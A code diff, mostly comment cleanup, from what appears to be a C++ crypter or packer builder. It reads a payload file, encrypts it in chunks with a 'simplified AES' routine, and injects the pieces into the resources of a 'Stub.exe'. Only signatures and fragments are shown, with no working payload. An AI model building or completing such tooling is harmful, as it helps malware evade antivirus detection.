@@ -15,12 +15,9 @@
 using namespace std;
 
 #define MAGIC_VALUE        0x474E5089
-// #define AES_SEED_KEY       ((uint8_t)(MAGIC_VALUE & 0xFF))
 #define DEFAULT_OUTPUT     "Stub.exe"
 
-// ============================================================================
 // STRUCTURES
-// ============================================================================
 #pragma pack(push, 1)
 struct PayloadIndex {
     uint32_t magic = MAGIC_VALUE;
@@ -33,16 +30,12 @@ struct PayloadIndex {
 };
 #pragma pack(pop)
 
-// ============================================================================
 // GLOBAL VARIABLES
-// ============================================================================
 char* fileBuffer = nullptr;
 string g_outputFile = DEFAULT_OUTPUT;
 string g_inputFile = "";
 
-// ============================================================================
 // CLI PARSING AND ERROR HANDLING
-// ============================================================================
 struct CLIParams {
     string inputFile;
     string outputFile;
@@ -215,9 +208,7 @@ bool ValidateOutputFile(const string& filename) {
     return true;
 }
 
-// ============================================================================
 // CRC32
-// ============================================================================
 uint32_t CalculateCRC32(const char* data, size_t length) {
     uint32_t crc = 0xFFFFFFFF;
     for (size_t i = 0; i < length; i++) {
@@ -228,9 +219,7 @@ uint32_t CalculateCRC32(const char* data, size_t length) {
     return ~crc;
 }
 
-// ============================================================================
 // FIXED FILE WRITING WITH DEBUG
-// ============================================================================
 bool WriteStubToFile() {
     cout << "[*] Writing stub to " << g_outputFile << "..." << endl;
     
@@ -266,9 +255,7 @@ bool WriteStubToFile() {
     return (size == Stub_exe_len);
 }
 
-// ============================================================================
 // SIMPLIFIED AES ENCRYPTION
-// ============================================================================
 std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long size, uint8_t seed_key) {
     const int CHUNK_SIZE = 4096;
     int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
@@ -384,9 +371,7 @@ std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long s
     return encrypted_chunks;
 }
 
-// ============================================================================
 // FIXED RESOURCE INJECTION WITH PROPER ERROR CHECKING
-// ============================================================================
 bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, 
                              long payloadSize, uint8_t seed_key) {
     cout << "[*] Starting resource injection with shuffle..." << endl;
@@ -497,9 +482,7 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
     return true;
 }
 
-// ============================================================================
 // FILE OPERATIONS
-// ============================================================================
 bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
     FILE* file = fopen(filename, "rb");
     if (!file) {
@@ -565,9 +548,7 @@ void Cleanup() {
     }
 }
 
-// ============================================================================
 // MAIN FUNCTION
-// ============================================================================
 int main(int argc, char* argv[]) {
     system("color 0a");
     
